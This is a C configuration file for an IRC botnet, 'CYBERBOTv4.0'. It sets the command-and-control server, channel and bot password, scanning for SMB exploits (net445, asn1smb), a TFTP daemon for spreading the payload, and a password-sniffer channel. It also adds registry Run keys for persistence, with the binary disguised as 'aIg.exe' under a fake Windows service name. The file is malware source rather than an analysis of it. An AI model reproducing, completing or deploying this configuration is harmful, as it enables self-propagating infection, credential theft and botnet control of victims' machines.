// CYBERBOTv4.0

int port = 1867;				// server port
int port2 = 1868;				// backup server port
int tftpport = 6900;				// Port # for tftp daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 7;				// how many random numbers in the nick
int nicktype = CONSTNICK;		// nick type (see rndnick.h)
BOOL nickprefix = FALSE;			// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="%temp%\\cyberlink.ocx";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.

// this is the best scan combo
SCANALL scanall[]={
{"net445", true},
{"asn1smb", true},
{NULL, false}
};
char lsaip[] = "192.168.1.1";                    // blank
char lsaport[] = "6969";			// cftp port ".lsaport 6969"
char lsuser[] = "admin";
char lspass[] = "admin";
char botid[] = "CYBER";						// bot id
char version[] = "CYBERBOTv4.0[ownz.DreamWoRK]";		// Bots !version reply
char password[] = "dreamX";					// bot password
char server[] = "irc.CYBER-TERROR.com";		// server
char serverpass[] = "";						// server password
char channel[] = "#Mass#";				// channel that the bot should join
char chanpass[] = "";						// channel password
char server2[] = "";						// backup server (optional)
char channel2[] = "";						// backup channel (optional)
char chanpass2[] = "";						// backup channel password (optional)
char filename[] = "aIg.exe";			// destination file name
char valuename[] = "Application Layer Gateway Service";		// value name for autostart
char nickconst[] = "WoRK";					// first part to the bot's nick
char szLocalPayloadFile[]="encrtpy.xml";	// Payload filename
char modeonconn[] = "+xi";					// Can be more than one mode and contain both + and -
char exploitchan[] = "#Mass#";					// Channel where exploit messages get redirected
char psniffchan[] = "#Mass#";						// Channel where psniff messages get redirected

char *authost[] = {
	"*@CYBER-TERROR.COM"
};

char *versionlist[] = {
"eggdrop v1.6.20",
"eggdrop v1.6.17",
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "9jah3msnso23kam2"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif
